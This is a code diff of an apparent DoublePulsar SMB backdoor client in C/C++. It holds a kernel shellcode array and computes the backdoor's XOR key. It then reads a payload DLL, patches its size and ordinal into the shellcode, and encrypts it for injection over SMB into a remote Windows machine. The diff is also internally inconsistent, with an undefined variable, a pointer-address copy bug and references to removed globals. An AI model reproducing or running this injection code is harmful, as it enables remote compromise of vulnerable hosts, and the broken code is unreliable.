@@ -429,126 +429,7 @@ unsigned char kernel_rundll_shellcode[] =
 "\xF3\xAA\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5E\x5F\x5D\x5B\xC3\xEB\x08\x00\x14\x00\x00\x01\x00\x00\x00";
 
 //globals
-HANDLE hProcHeap;
 unsigned char recvbuff[2048];
-
-typedef struct {
-	LPBYTE lpbData;
-	DWORD dwDataSize;
-} BUFFER_WITH_SIZE;
-
-typedef BUFFER_WITH_SIZE* PBUFFER_WITH_SIZE;
-#define SHELLC_DLL_SIZE_OFFSET 0xf82
-#define SHELLC_ORDINAL_OFFSET 0xf86
-
-void read_file(LPCSTR filename, PBUFFER_WITH_SIZE pBws)
-{
-	HANDLE hFile;
-	LONGLONG llFileSize;
-	LARGE_INTEGER liFileSize;
-	DWORD dwBytesRead;
-	DWORD dwTotalBytesRead;
-	LPBYTE lpFileData;
-	BOOL bResult;
-
-	hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		printf("Could not open file %s\n", filename);
-		exit(1);
-	}
-
-	bResult = GetFileSizeEx(hFile, &liFileSize);
-	if (!bResult)
-	{
-		printf("Error getting size of file %s\n", filename);
-		exit(1);
-	}
-	llFileSize = liFileSize.QuadPart;
-
-	lpFileData = *(LPBYTE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, llFileSize);
-	if (lpFileData == NULL)
-	{
-		printf("Error allocating memory\n");
-		exit(1);
-	}
-
-	dwTotalBytesRead = 0;
-	do
-	{
-		bResult = ReadFile(hFile, lpFileData + dwTotalBytesRead,
-			llFileSize - dwTotalBytesRead, &dwBytesRead, NULL);
-		dwTotalBytesRead += dwBytesRead;
-	} while (!(bResult && dwBytesRead == 0) || !bResult);
-	if (!bResult)
-	{
-		printf("Error reading file %s\n", filename);
-		exit(1);
-	}
-
-	CloseHandle(hFile);
-
-	pBws->lpbData = lpFileData;
-	pBws->dwDataSize = llFileSize;
-}
-
-void read_shellcode(PBUFFER_WITH_SIZE pBws)
-{
-	LONGLONG llFileSize;
-	LPBYTE lpFileData;
-
-	llFileSize = sizeof(kernel_rundll_shellcode);
-	lpFileData = *(LPBYTE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, llFileSize);
-	if (lpFileData == NULL)
-	{
-		printf("Error allocating memory\n");
-		exit(1);
-	}
-
-	pBws->lpbData = lpFileData;
-	pBws->dwDataSize = llFileSize;
-}
-
-void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBUFFER_WITH_SIZE pBws)
-{
-	BUFFER_WITH_SIZE shellcode;
-	BUFFER_WITH_SIZE dll;
-	DWORD dwPayloadSize;
-	LPBYTE lpbPayload;
-
-	//not reading shellcode from file; it's static and in memory
-	//read_file(shellcode_file, &shellcode);
-	read_shellcode(&shellcode);
-	read_file(dll_file, &dll);
-
-	dwPayloadSize = shellcode.dwDataSize + dll.dwDataSize;
-
-	lpbPayload = *(LPBYTE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, dwPayloadSize);
-	if (lpbPayload == NULL)
-	{
-		printf("Error allocating memory\n");
-		exit(1);
-	}
-
-	// Edit shellcode to include ordinal and shellcode size
-	memcpy_s(shellcode.lpbData + SHELLC_DLL_SIZE_OFFSET,
-		shellcode.dwDataSize - SHELLC_DLL_SIZE_OFFSET, &(dll.dwDataSize), sizeof(dwPayloadSize));
-	memcpy_s(shellcode.lpbData + SHELLC_ORDINAL_OFFSET,
-		shellcode.dwDataSize - SHELLC_ORDINAL_OFFSET, &ordinal, sizeof(ordinal));
-
-	// Put it all together, shellcode + DLL
-	memcpy_s(lpbPayload, dwPayloadSize, shellcode.lpbData, shellcode.dwDataSize);
-	memcpy_s(lpbPayload + shellcode.dwDataSize, dwPayloadSize - shellcode.dwDataSize,
-		dll.lpbData, dll.dwDataSize);
-	if (shellcode.lpbData != NULL)
-		HeapFree(hProcHeap, 0, shellcode.lpbData);
-	if (dll.lpbData != NULL)
-		HeapFree(hProcHeap, 0, dll.lpbData);
-
-	pBws->lpbData = lpbPayload;
-	pBws->dwDataSize = dwPayloadSize;
-}
 
 int xor_payload(unsigned int xor_key, char *buf, int size)
 {
@@ -691,23 +572,58 @@ int main(int argc, char* argv[])
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 	
-	BUFFER_WITH_SIZE payload;
-	LPCSTR shellcode_file;
-	LPCSTR dll_file;
-	DWORD ordinal;
-	shellcode_file = "userland_shellcode.bin";
-	dll_file = "payload.dll";
-	ordinal = 1;
-	
-	//construct payload 
-	construct_payload(shellcode_file, dll_file, ordinal, &payload);
+	//choose your DLL  here
+	char filename[MAX_PATH] = "payload.dll";
+	printf("Loading file: %s\n", filename);
+	DWORD	dwFileSizeLow = NULL;
+	DWORD	dwFileSizeHigh = NULL;
+	DWORD	dwOffset = NULL;
+	DWORD	dwDummy = -1;
+	HANDLE hFile = CreateFileA(
+		filename,
+		GENERIC_READ,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL);
 
-	//XOR the data buffer with the calculated key
-	int len = sizeof(payload.lpbData)/sizeof(payload.lpbData[0]);
+	dwFileSizeLow = GetFileSize(hFile, &dwFileSizeHigh);
+	printf("> File Size: %d bytes\n", dwFileSizeLow);
+
+	//alloc memory the size of of the DLL
+	PBYTE pExeBuffer = new BYTE[dwFileSizeLow];
+
+	while (dwDummy)
+	{
+		ReadFile(hFile, pExeBuffer + dwOffset, 512, &dwDummy, NULL);
+		dwOffset += dwDummy;
+		//printf("> Read %d bytes - Offset = %d\n", dwDummy, dwOffset);
+	}
+
+	CloseHandle(hFile);
+	
+	int total_payload_size = dwFileSizeLow + 6144;
 	unsigned char *encrypted;
-	encrypted = (unsigned char*)malloc(len+1);
-	memset(encrypted,'\0',len);
-	xor_payload(XorKey, payload.lpbData, len);
+	encrypted = (unsigned char*)malloc(total_payload_size+1);
+	memset(encrypted,0x00,total_payload_size);
+	memcpy(encrypted, kernel_rundll_shellcode, 6144);
+	//copy DLL to offset after kernel shellcode
+	memcpy(encrypted + 6144, (char*)&pExeBuffer, dwFileSizeLow);
+	//patch values
+	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
+	*(DWORD*)&kernel_rundll_shellcode[2158] = int(dwFileSizeLow + 3978);
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
+
+	printf("patching DLL size...\n");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	printf("patching DLL ordinal...\n");
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
+	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+	xor_payload(XorKey, (char*)pExeBuffer, full_size);
 
 	//build packet buffer with 4178 bytes in length
 	//70 bytes for the Trans2 Session Setup packet header
@@ -878,6 +794,9 @@ cleanup:
 		HeapFree(hProcHeap, 0, payload.lpbData);
 	}
 
+	//release pExeBuffer
+	delete pExeBuffer;
+	
 	//free the memory for the XOR buffer
 	free(encrypted);
 
